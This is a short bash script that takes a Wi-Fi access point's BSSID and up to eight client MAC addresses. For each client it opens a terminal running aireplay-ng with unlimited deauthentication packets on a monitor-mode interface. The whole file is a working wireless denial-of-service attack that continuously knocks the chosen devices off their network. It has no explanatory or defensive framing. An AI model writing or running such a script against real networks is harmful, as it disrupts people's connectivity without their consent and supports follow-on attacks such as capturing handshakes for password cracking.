#!/bin/bash

bssid=$1
mac=$2
macI=$3
macII=$4
macIII=$5
macIV=$6
macV=$7
macVI=$8
macVII=$9
gnome-terminal -e "bash -c \"aireplay-ng --deauth 0 -c $mac -a $bssid wlp2s0mon; echo $mac; exec bash\""
gnome-terminal -e "bash -c \"aireplay-ng --deauth 0 -c $macI -a $bssid wlp2s0mon; echo $macI; exec bash\""	
gnome-terminal -e "bash -c \"aireplay-ng --deauth 0 -c $macII -a $bssid wlp2s0mon; echo $macII; exec bash\""
gnome-terminal -e "bash -c \"aireplay-ng --deauth 0 -c $macIII -a $bssid wlp2s0mon; echo $macIII; exec bash\""
gnome-terminal -e "bash -c \"aireplay-ng --deauth 0 -c $macIV -a $bssid wlp2s0mon; echo $macIV; exec bash\""
gnome-terminal -e "bash -c \"aireplay-ng --deauth 0 -c $macV -a $bssid wlp2s0mon; echo $macV; exec bash\""
gnome-terminal -e "bash -c \"aireplay-ng --deauth 0 -c $macVI -a $bssid wlp2s0mon; echo $macVI; exec bash\""
gnome-terminal -e "bash -c \"aireplay-ng --deauth 0 -c $macVII -a $bssid wlp2s0mon; echo $macVII; exec bash\""
